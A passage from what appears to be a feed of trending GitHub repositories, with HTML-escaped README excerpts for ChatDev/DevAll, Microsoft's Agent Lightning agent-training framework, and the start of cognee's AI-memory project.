 &lt;li&gt;&lt;strong&gt;Getting Started&lt;/strong&gt;: &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/docs/user_guide/en/index.md"&gt;Start Guide&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Core Modules&lt;/strong&gt;: &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/docs/user_guide/en/workflow_authoring.md"&gt;Workflow Authoring&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/docs/user_guide/en/modules/memory.md"&gt;Memory&lt;/a&gt;, and &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/docs/user_guide/en/modules/tooling/index.md"&gt;Tooling&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üåü Featured Workflows&lt;/h2&gt; 
&lt;p&gt;We provide robust, out-of-the-box templates for common scenarios. All runnable workflow configs are located in &lt;code&gt;yaml_instance/&lt;/code&gt;.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Demos&lt;/strong&gt;: Files named &lt;code&gt;demo_*.yaml&lt;/code&gt; showcase specific features or modules.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Implementations&lt;/strong&gt;: Files named directly (e.g., &lt;code&gt;ChatDev_v1.yaml&lt;/code&gt;) are full in-house or recreated workflows. As follows:&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;üìã Workflow Collection&lt;/h3&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align="left"&gt;Category&lt;/th&gt; 
   &lt;th align="left"&gt;Workflow&lt;/th&gt; 
   &lt;th align="left"&gt;Case&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;strong&gt;üìà Data Visualization&lt;/strong&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;data_visualization_basic.yaml&lt;/code&gt;&lt;br /&gt;&lt;code&gt;data_visualization_enhanced.yaml&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/cases/data_analysis/data_analysis.gif" width="100%" /&gt;&lt;br /&gt;Prompt: &lt;em&gt;"Create 4‚Äì6 high-quality PNG charts for my large real-estate transactions dataset."&lt;/em&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;strong&gt;üõ†Ô∏è 3D Generation&lt;/strong&gt;&lt;br /&gt;&lt;em&gt;(Requires &lt;a href="https://www.blender.org/"&gt;Blender&lt;/a&gt; &amp;amp; &lt;a href="https://github.com/ahujasid/blender-mcp"&gt;blender-mcp&lt;/a&gt;)&lt;/em&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;blender_3d_builder_simple.yaml&lt;/code&gt;&lt;br /&gt;&lt;code&gt;blender_3d_builder_hub.yaml&lt;/code&gt;&lt;br /&gt;&lt;code&gt;blender_scientific_illustration.yaml&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/cases/3d_generation/3d.gif" width="100%" /&gt;&lt;br /&gt;Prompt: &lt;em&gt;"Please build a Christmas tree."&lt;/em&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;strong&gt;üéÆ Game Dev&lt;/strong&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;GameDev_v1.yaml&lt;/code&gt;&lt;br /&gt;&lt;code&gt;ChatDev_v1.yaml&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/cases/game_development/game.gif" width="100%" /&gt;&lt;br /&gt;Prompt: &lt;em&gt;"Please help me design and develop a Tank Battle game."&lt;/em&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;strong&gt;üìö Deep Research&lt;/strong&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;deep_research_v1.yaml&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/cases/deep_research/deep_research.gif" width="85%" /&gt;&lt;br /&gt;Prompt: &lt;em&gt;"Research about recent advances in the field of LLM-based agent RL"&lt;/em&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;strong&gt;üéì Teach Video&lt;/strong&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;teach_video.yaml&lt;/code&gt; (Please run command &lt;code&gt;uv add manim&lt;/code&gt; before running this workflow)&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/cases/video_generation/video.gif" width="140%" /&gt;&lt;br /&gt;Prompt: &lt;em&gt;"ËÆ≤‰∏Ä‰∏ã‰ªÄ‰πàÊòØÂá∏‰ºòÂåñ"&lt;/em&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;hr /&gt; 
&lt;h3&gt;üí° Usage Guide&lt;/h3&gt; 
&lt;p&gt;For those implementations, you can use the &lt;strong&gt;Launch&lt;/strong&gt; tab to execute them.&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;Select&lt;/strong&gt;: Choose a workflow in the &lt;strong&gt;Launch&lt;/strong&gt; tab.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Upload&lt;/strong&gt;: Upload necessary files (e.g., &lt;code&gt;.csv&lt;/code&gt; for data analysis) if required.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Prompt&lt;/strong&gt;: Enter your request (e.g., &lt;em&gt;"Visualize the sales trends"&lt;/em&gt; or &lt;em&gt;"Design a snake game"&lt;/em&gt;).&lt;/li&gt; 
&lt;/ol&gt; 
&lt;hr /&gt; 
&lt;h2&gt;ü§ù Contributing&lt;/h2&gt; 
&lt;p&gt;We welcome contributions from the community! Whether you're fixing bugs, adding new workflow templates, or sharing high-quality cases/artifacts produced by DevAll, your help is much appreciated. Feel free to contribute by submitting &lt;strong&gt;Issues&lt;/strong&gt; or &lt;strong&gt;Pull Requests&lt;/strong&gt;.&lt;/p&gt; 
&lt;p&gt;By contributing to DevAll, you'll be recognized in our &lt;strong&gt;Contributors&lt;/strong&gt; list below. Check out our &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/#developers"&gt;Developer Guide&lt;/a&gt; to get started!&lt;/p&gt; 
&lt;h3&gt;üë• Contributors&lt;/h3&gt; 
&lt;h4&gt;Primary Contributors&lt;/h4&gt; 
&lt;table&gt; 
 &lt;tbody&gt;
  &lt;tr&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/NA-Wen"&gt;&lt;img src="https://github.com/NA-Wen.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;NA-Wen&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/zxrys"&gt;&lt;img src="https://github.com/zxrys.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;zxrys&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/swugi"&gt;&lt;img src="https://github.com/swugi.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;swugi&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/huatl98"&gt;&lt;img src="https://github.com/huatl98.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;huatl98&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt;
&lt;/table&gt; 
&lt;h4&gt;Contributors&lt;/h4&gt; 
&lt;table&gt; 
 &lt;tbody&gt;
  &lt;tr&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/shiowen"&gt;&lt;img src="https://github.com/shiowen.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;shiowen&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/kilo2127"&gt;&lt;img src="https://github.com/kilo2127.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;kilo2127&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/AckerlyLau"&gt;&lt;img src="https://github.com/AckerlyLau.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;AckerlyLau&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt; 
&lt;h2&gt;ü§ù Acknowledgments&lt;/h2&gt; 
&lt;p&gt;&lt;a href="http://nlp.csai.tsinghua.edu.cn/"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/thunlp.png" height="50pt" /&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp; &lt;a href="https://modelbest.cn/"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/modelbest.png" height="50pt" /&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp; &lt;a href="https://github.com/OpenBMB/AgentVerse/"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/agentverse.png" height="50pt" /&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp; &lt;a href="https://github.com/OpenBMB/RepoAgent"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/repoagent.png" height="50pt" /&gt;&lt;/a&gt; &lt;a href="https://app.commanddash.io/agent?github=https://github.com/OpenBMB/ChatDev"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/CommandDash.png" height="50pt" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/www.teachmaster.cn"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/teachmaster.png" height="50pt" /&gt;&lt;/a&gt; &lt;a href="https://github.com/OpenBMB/AppCopilot"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/appcopilot.png" height="50pt" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;üîé Citation&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;@article{chatdev,
    title = {ChatDev: Communicative Agents for Software Development},
    author = {Chen Qian and Wei Liu and Hongzhang Liu and Nuo Chen and Yufan Dang and Jiahao Li and Cheng Yang and Weize Chen and Yusheng Su and Xin Cong and Juyuan Xu and Dahai Li and Zhiyuan Liu and Maosong Sun},
    journal = {arXiv preprint arXiv:2307.07924},
    url = {https://arxiv.org/abs/2307.07924},
    year = {2023}
}

@article{colearning,
    title = {Experiential Co-Learning of Software-Developing Agents},
    author = {Chen Qian and Yufan Dang and Jiahao Li and Wei Liu and Zihao Xie and Yifei Wang and Weize Chen and Cheng Yang and Xin Cong and Xiaoyin Che and Zhiyuan Liu and Maosong Sun},
    journal = {arXiv preprint arXiv:2312.17025},
    url = {https://arxiv.org/abs/2312.17025},
    year = {2023}
}

@article{macnet,
    title={Scaling Large-Language-Model-based Multi-Agent Collaboration},
    author={Chen Qian and Zihao Xie and Yifei Wang and Wei Liu and Yufan Dang and Zhuoyun Du and Weize Chen and Cheng Yang and Zhiyuan Liu and Maosong Sun}
    journal={arXiv preprint arXiv:2406.07155},
    url = {https://arxiv.org/abs/2406.07155},
    year={2024}
}

@article{iagents,
    title={Autonomous Agents for Collaborative Task under Information Asymmetry},
    author={Wei Liu and Chenxi Wang and Yifei Wang and Zihao Xie and Rennai Qiu and Yufan Dnag and Zhuoyun Du and Weize Chen and Cheng Yang and Chen Qian},
    journal={arXiv preprint arXiv:2406.14928},
    url = {https://arxiv.org/abs/2406.14928},
    year={2024}
}

@article{puppeteer,
      title={Multi-Agent Collaboration via Evolving Orchestration}, 
      author={Yufan Dang and Chen Qian and Xueheng Luo and Jingru Fan and Zihao Xie and Ruijie Shi and Weize Chen and Cheng Yang and Xiaoyin Che and Ye Tian and Xuantang Xiong and Lei Han and Zhiyuan Liu and Maosong Sun},
      journal={arXiv preprint arXiv:2505.19591},
      url={https://arxiv.org/abs/2505.19591},
      year={2025}
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;üì¨ Contact&lt;/h2&gt; 
&lt;p&gt;If you have any questions, feedback, or would like to get in touch, please feel free to reach out to us via email at &lt;a href="mailto:qianc62@gmail.com"&gt;qianc62@gmail.com&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>microsoft/agent-lightning</title>
      <link>https://github.com/microsoft/agent-lightning</link>
      <description>&lt;p&gt;The absolute trainer to light up AI agents.&lt;/p&gt;&lt;hr&gt;&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/microsoft/agent-lightning/main/docs/assets/readme-banner.svg?sanitize=true" alt="Agent-lightning-banner" style="width:600px" /&gt; &lt;/p&gt; 
&lt;h1&gt;Agent Lightning‚ö°&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/badge-unit.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/badge-unit.yml/badge.svg?sanitize=true" alt="Unit Tests" /&gt;&lt;/a&gt; &lt;a href="https://microsoft.github.io/agent-lightning/"&gt;&lt;img src="https://img.shields.io/badge/GitHub%20Pages-Documentation-blue" alt="Documentation" /&gt;&lt;/a&gt; &lt;a href="https://badge.fury.io/py/agentlightning"&gt;&lt;img src="https://badge.fury.io/py/agentlightning.svg?sanitize=true" alt="PyPI version" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/microsoft/agent-lightning/main/LICENSE"&gt;&lt;img src="https://img.shields.io/badge/license-MIT-blue.svg?sanitize=true" alt="License" /&gt;&lt;/a&gt; &lt;a href="https://deepwiki.com/microsoft/agent-lightning"&gt;&lt;img src="https://deepwiki.com/badge.svg?sanitize=true" alt="Ask DeepWiki" /&gt;&lt;/a&gt; &lt;a href="https://discord.gg/RYk7CdvDR7"&gt;&lt;img src="https://img.shields.io/badge/Discord-Join-5865F2?logo=discord&amp;amp;logoColor=white" alt="Discord" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;The absolute trainer to light up AI agents.&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Join our &lt;a href="https://discord.gg/RYk7CdvDR7"&gt;Discord community&lt;/a&gt; to connect with other users and contributors.&lt;/p&gt; 
&lt;h2&gt;‚ö° Core Features&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Turn your agent into an optimizable beast with &lt;strong&gt;ZERO CODE CHANGE&lt;/strong&gt; (almost)! üí§&lt;/li&gt; 
 &lt;li&gt;Build with &lt;strong&gt;ANY&lt;/strong&gt; agent framework (LangChain, OpenAI Agent SDK, AutoGen, CrewAI, Microsoft Agent Framework...); or even WITHOUT agent framework (Python OpenAI). You name it! ü§ñ&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Selectively&lt;/strong&gt; optimize one or more agents in a multi-agent system. üéØ&lt;/li&gt; 
 &lt;li&gt;Embraces &lt;strong&gt;Algorithms&lt;/strong&gt; like Reinforcement Learning, Automatic Prompt Optimization, Supervised Fine-tuning and more. ü§ó&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Read more on our &lt;a href="https://microsoft.github.io/agent-lightning/"&gt;documentation website&lt;/a&gt;.&lt;/p&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/microsoft/agent-lightning/main/docs/assets/readme-diff.svg?sanitize=true" alt="Agent-Lightning Core Quickstart" style="width:100%" /&gt; &lt;/p&gt; 
&lt;h2&gt;‚ö° Installation&lt;/h2&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;pip install agentlightning
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For the latest nightly build (cutting-edge features), you can install from Test PyPI:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;pip install --upgrade --index-url https://test.pypi.org/simple/ --extra-index-url https://pypi.org/simple/ --pre agentlightning
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Please refer to our &lt;a href="https://microsoft.github.io/agent-lightning/stable/tutorials/installation/"&gt;installation guide&lt;/a&gt; for more details.&lt;/p&gt; 
&lt;p&gt;To start using Agent-lightning, check out our &lt;a href="https://microsoft.github.io/agent-lightning/"&gt;documentation&lt;/a&gt; and &lt;a href="https://raw.githubusercontent.com/microsoft/agent-lightning/main/examples"&gt;examples&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;‚ö° Articles&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;12/17/2025 &lt;a href="https://agent-lightning.github.io/posts/trajectory_level_aggregation/"&gt;Adopting the Trajectory Level Aggregation for Faster Training&lt;/a&gt; Agent-lightning blog.&lt;/li&gt; 
 &lt;li&gt;11/4/2025 &lt;a href="https://medium.com/@yugez/tuning-any-ai-agent-with-tinker-agent-lightning-part-1-1d8c9a397f0e"&gt;Tuning ANY AI agent with Tinker ‚úï Agent-lightning&lt;/a&gt; Medium. See also &lt;a href="https://medium.com/@yugez/tuning-any-ai-agent-with-tinker-agent-lightning-part-2-332c5437f0dc"&gt;Part 2&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;10/22/2025 &lt;a href="https://blog.vllm.ai/2025/10/22/agent-lightning.html"&gt;No More Retokenization Drift: Returning Token IDs via the OpenAI Compatible API Matters in Agent RL&lt;/a&gt; vLLM blog. See also &lt;a href="https://zhuanlan.zhihu.com/p/1965067274642785725"&gt;Zhihu writeup&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;8/11/2025 &lt;a href="https://medium.com/@yugez/training-ai-agents-to-write-and-self-correct-sql-with-reinforcement-learning-571ed31281ad"&gt;Training AI Agents to Write and Self-correct SQL with Reinforcement Learning&lt;/a&gt; Medium.&lt;/li&gt; 
 &lt;li&gt;8/5/2025 &lt;a href="https://arxiv.org/abs/2508.03680"&gt;Agent Lightning: Train ANY AI Agents with Reinforcement Learning&lt;/a&gt; arXiv paper.&lt;/li&gt; 
 &lt;li&gt;7/26/2025 &lt;a href="https://www.reddit.com/r/LocalLLaMA/comments/1m9m670/we_discovered_an_approach_to_train_any_ai_agent/"&gt;We discovered an approach to train any AI agent with RL, with (almost) zero code changes.&lt;/a&gt; Reddit.&lt;/li&gt; 
 &lt;li&gt;6/6/2025 &lt;a href="https://www.microsoft.com/en-us/research/project/agent-lightning/"&gt;Agent Lightning - Microsoft Research&lt;/a&gt; Project page.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;‚ö° Community Projects&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/af-74413592/DeepWerewolf"&gt;DeepWerewolf&lt;/a&gt; ‚Äî A case study of agent RL training for the Chinese Werewolf game built with AgentScope and Agent Lightning.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://agentflow.stanford.edu/"&gt;AgentFlow&lt;/a&gt; ‚Äî A modular multi-agent framework that combines planner, executor, verifier, and generator agents with the Flow-GRPO algorithm to tackle long-horizon, sparse-reward tasks.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/TencentCloudADP/Youtu-agent"&gt;Youtu-Agent&lt;/a&gt; ‚Äî Youtu-Agent lets you build and train your agent with ease. Built with &lt;a href="https://github.com/microsoft/agent-lightning/tree/contrib/youtu-agent-lightning"&gt;a modified branch&lt;/a&gt; of Agent Lightning, Youtu-Agent has verified up to 128 GPUs RL training on maths/code and search capabilities with steady convergence. Also check &lt;a href="https://github.com/TencentCloudADP/youtu-agent/tree/rl/agl"&gt;the recipe&lt;/a&gt; and their blog &lt;a href="https://spotted-coconut-df8.notion.site/Stop-Wrestling-with-Your-Agent-RL-How-Youtu-Agent-Achieved-Stable-128-GPU-Scaling-Without-Breaking-2ca5e8f089ba80539a98c582b65e0233"&gt;&lt;em&gt;Stop Wrestling with Your Agent RL: How Youtu-Agent Achieved Stable, 128-GPU Scaling Without Breaking a Sweat&lt;/em&gt;&lt;/a&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;‚ö° Architecture&lt;/h2&gt; 
&lt;p&gt;Agent Lightning keeps the moving parts to a minimum so you can focus on your idea, not the plumbing. Your agent continues to run as usual; you can still use any agent framework you like; you drop in the lightweight &lt;code&gt;agl.emit_xxx()&lt;/code&gt; helper, or let the tracer collect every prompt, tool call, and reward. Those events become structured spans that flow into the LightningStore, a central hub that keeps tasks, resources, and traces in sync.&lt;/p&gt; 
&lt;p&gt;On the other side of the store sits the algorithm you choose, or write yourself. The algorithm reads spans, learns from them, and posts updated resources such as refined prompt templates or new policy weights. The Trainer ties it all together: it streams datasets to runners, ferries resources between the store and the algorithm, and updates the inference engine when improvements land. You can either stop there, or simply let the same loop keep turning.&lt;/p&gt; 
&lt;p&gt;No rewrites, no lock-in, just a clear path from first rollout to steady improvement.&lt;/p&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/microsoft/agent-lightning/main/docs/assets/readme-architecture.svg?sanitize=true" alt="Agent-lightning Architecture" style="width:100%" /&gt; &lt;/p&gt; 
&lt;h2&gt;‚ö° CI Status&lt;/h2&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Workflow&lt;/th&gt; 
   &lt;th&gt;Status&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;CPU Tests&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/tests.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/tests.yml/badge.svg?sanitize=true" alt="tests workflow status" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Full Tests&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/badge-unit.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/badge-unit.yml/badge.svg?sanitize=true" alt="tests summary workflow status" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;UI Tests&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/dashboard.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/dashboard.yml/badge.svg?sanitize=true" alt="UI Tests" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Examples Integration&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/badge-examples.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/badge-examples.yml/badge.svg?sanitize=true" alt="examples summary workflow status" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Latest Dependency Compatibility&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/badge-latest.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/badge-latest.yml/badge.svg?sanitize=true" alt="latest summary workflow status" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Legacy Examples Compatibility&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/badge-compat.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/badge-compat.yml/badge.svg?sanitize=true" alt="compat summary workflow status" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h2&gt;‚ö° Citation&lt;/h2&gt; 
&lt;p&gt;If you find Agent Lightning useful in your research or projects, please cite our paper:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bibtex"&gt;@misc{luo2025agentlightningtrainai,
      title={Agent Lightning: Train ANY AI Agents with Reinforcement Learning},
      author={Xufang Luo and Yuge Zhang and Zhiyuan He and Zilong Wang and Siyun Zhao and Dongsheng Li and Luna K. Qiu and Yuqing Yang},
      year={2025},
      eprint={2508.03680},
      archivePrefix={arXiv},
      primaryClass={cs.AI},
      url={https://arxiv.org/abs/2508.03680},
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;‚ö° Contributing&lt;/h2&gt; 
&lt;p&gt;This project welcomes contributions and suggestions. Start by reading the &lt;a href="https://raw.githubusercontent.com/microsoft/agent-lightning/main/docs/community/contributing.md"&gt;Contributing Guide&lt;/a&gt; for recommended contribution points, environment setup, branching conventions, and pull request expectations. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit &lt;a href="https://cla.opensource.microsoft.com"&gt;https://cla.opensource.microsoft.com&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;When you submit a pull request, a CLA bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA.&lt;/p&gt; 
&lt;p&gt;This project has adopted the &lt;a href="https://opensource.microsoft.com/codeofconduct/"&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href="https://opensource.microsoft.com/codeofconduct/faq/"&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href="mailto:opencode@microsoft.com"&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt; 
&lt;h2&gt;‚ö° Trademarks&lt;/h2&gt; 
&lt;p&gt;This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft trademarks or logos is subject to and must follow &lt;a href="https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general"&gt;Microsoft's Trademark &amp;amp; Brand Guidelines&lt;/a&gt;. Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship. Any use of third-party trademarks or logos are subject to those third-party's policies.&lt;/p&gt; 
&lt;h2&gt;‚ö° Responsible AI&lt;/h2&gt; 
&lt;p&gt;This project has been evaluated and certified to comply with the Microsoft Responsible AI Standard. The team will continue to monitor and maintain the repository, addressing any severe issues, including potential harms, if they arise.&lt;/p&gt; 
&lt;h2&gt;‚ö° License&lt;/h2&gt; 
&lt;p&gt;This project is licensed under the MIT License. See the &lt;a href="https://raw.githubusercontent.com/microsoft/agent-lightning/main/LICENSE"&gt;LICENSE&lt;/a&gt; file for details.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>topoteretes/cognee</title>
      <link>https://github.com/topoteretes/cognee</link>
      <description>&lt;p&gt;Memory for AI Agents in 6 lines of code&lt;/p&gt;&lt;hr&gt;&lt;div align="center"&gt; 
 &lt;a href="https://github.com/topoteretes/cognee"&gt; &lt;img src="https://raw.githubusercontent.com/topoteretes/cognee/refs/heads/dev/assets/cognee-logo-transparent.png" alt="Cognee Logo" height="60" /&gt; &lt;/a&gt; 
 &lt;br /&gt; 
 &lt;p&gt;Cognee - Accurate and Persistent AI Memory&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;a href="https://www.youtube.com/watch?v=1bezuvLwJmw&amp;amp;t=2s"&gt;Demo&lt;/a&gt; . &lt;a href="https://docs.cognee.ai/"&gt;Docs&lt;/a&gt; . &lt;a href="https://cognee.ai"&gt;Learn More&lt;/a&gt; ¬∑ &lt;a href="https://discord.gg/NQPKmU5CCg"&gt;Join Discord&lt;/a&gt; ¬∑ &lt;a href="https://www.reddit.com/r/AIMemory/"&gt;Join r/AIMemory&lt;/a&gt; . &lt;a href="https://github.com/topoteretes/cognee-community"&gt;Community Plugins &amp;amp; Add-ons&lt;/a&gt; &lt;/p&gt; 
